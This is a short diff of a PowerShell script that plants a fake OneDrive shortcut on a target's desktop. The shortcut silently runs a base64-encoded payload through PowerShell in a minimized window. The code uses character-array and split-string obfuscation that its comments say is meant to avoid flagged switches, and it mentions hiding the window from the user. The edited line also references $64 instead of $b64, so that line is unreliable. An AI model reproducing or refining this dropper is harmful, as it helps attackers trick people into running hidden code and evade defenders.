@@ -16,12 +16,12 @@ $Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\onedriv
 $Shortcut.RelativePath =  "powershell"
 
 #edit here if you want a different icon, no it doesn't save the icon to it so i'd pick a popular path one target will have
-$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
+#$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
 $Shortcut.TargetPath = "powershell"
 
 #fist bit is to decode the base64 then execute it, avoids using -encodedCommand switch which gets flagged a lot
-$Shortcut.Arguments = ("[text.encoding]::([char[]](97,83,99,105,73)-join'').([char[]](103,69,84,115,116,82,73,110,103)-join'')([convert]::([char[]](102,82,111,77,98,65,115,69,54,52,115,84,114,73,78,103)-join'')('"+$b64+"'))|powe''rshell")
+$Shortcut.Arguments = ("[text.encoding]::ascii.getstring([convert]::('fr'+'om'+'base6'+'4st'+'ri'+'ng')('"+$64+"'))|powershell")
 
-#start powershell minimized and it should disappear in like a second so good luck
+#start powershell minimized and then you can hide it
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
